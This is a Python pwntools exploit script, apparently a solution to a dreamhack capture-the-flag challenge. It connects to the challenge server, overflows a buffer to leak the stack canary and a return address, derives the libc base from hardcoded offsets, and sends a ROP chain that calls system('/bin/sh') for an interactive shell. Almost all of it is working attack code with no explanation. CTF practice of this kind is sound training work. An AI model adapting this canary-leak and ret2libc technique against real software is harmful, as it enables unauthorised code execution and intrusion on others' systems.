from pwn import *

# p = process('./chall', env={'LD_PRELOAD': './libc.so.6'})
p = remote('host3.dreamhack.games', 19208)
e = ELF('./chall')
libc = ELF('./libc.so.6')

def slog(name, addr): return success(': '.join([name, hex(addr)]))

def edit(idx, payload):
    p.sendlineafter(b'>> ', b'2')

    p.sendlineafter(b'Enter train number: ', str(idx).encode())

    p.send(payload)

def show(idx):
    p.sendlineafter(b'>> ', b'1')

    p.sendlineafter(b'Enter train number: ', str(idx).encode())

# [1] Leak Canary
edit(0, b'A' * 8)       # size overwrite

edit(1, b'A' * 0x89)    # first chunk has canary

show(1)

p.recvuntil(b'A' * 0x89)
cnry = u64(b'\x00' + p.recvn(7))
slog('canary', cnry)

# [2] Leak main() return address
edit(1, b'A' * 0x98)

show(1)

p.recvuntil(b'A' * 0x98)
main_return_addr = u64(p.recvn(6) + b'\x00' * 2)
slog('main return address', main_return_addr)

# [3] Calculate Libc base address
libc_start_call_main = main_return_addr - 122
libc_base = libc_start_call_main - 0x2a150
pop_rdi = libc_base + 0x10f75b
ret = libc_base + 0x2882f
system = libc_base + 0x58750
binsh = libc_base + next(libc.search('/bin/sh'))

slog('libc base', libc_base)

# [4] ROP Chain
payload = b'A' * 0x88 + p64(cnry) + p64(0xDEADBEEF)
payload += p64(pop_rdi) + p64(binsh)
payload += p64(ret) + p64(system)

edit(1, payload)

p.sendlineafter(b'>> ', b'0')

p.interactive()